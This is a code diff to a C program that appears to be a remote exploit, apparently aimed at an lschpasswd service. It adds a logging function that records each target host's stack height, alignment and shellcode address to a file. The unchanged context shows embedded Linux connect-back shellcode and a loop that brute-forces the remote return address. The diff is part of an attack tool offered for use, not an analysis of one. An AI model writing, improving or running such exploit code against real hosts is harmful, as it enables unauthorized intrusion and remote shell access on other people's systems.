@@ -20,6 +20,10 @@
 #include <stdio.h>
 #include <string.h>
 #include <ctype.h>
+#include <stdarg.h>
+#include <errno.h>
+#include <time.h>
+
 #include "net.h"
 
 
@@ -27,6 +31,8 @@
 #define DEFAULT_HTTP_PORT 80
 
 #define SCAN_TIMEOUT 5
+
+#define LOG_FILE "lschpasswd.log"
 
 
 // Linux connect back shellcode
@@ -90,6 +96,32 @@ char lnx_connect_back[] =
 	"\x40"
 	"\xcd\x80"; 
 
+
+
+void
+log_result (char * fmt, ...)
+{
+	FILE * fp;
+	va_list ap;
+	
+	char Date[32];
+	time_t now;
+
+	now = time (NULL);
+	strftime (Date, sizeof (Date), "%Y/%m/%d %H:%M:%S", localtime (&now));
+
+	fp = fopen (LOG_FILE, "a+");
+	if (!fp) {
+		printf ("Error opening/creating %s:%s\n", LOG_FILE, strerror (errno));
+		return;
+	}
+
+	va_start (ap, fmt);
+	vfprintf (fp, fmt, ap);
+	va_end (ap);
+
+	fclose (fp);
+}
 
 
 inline void
@@ -475,6 +507,9 @@ main (int argc, char ** argv)
 	printf ("\n\n");
 	printf (">> Partial exploit result:\n");
 	printf (">> Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+
+	log_result ("Host address %s: stack_height=%d align=%d shellcode address=0x%08x\n", host, stack_height, align, expect_shellcode_addr);
+
 	printf ("Brute forcing remote return address into stack...\n");
 
 	
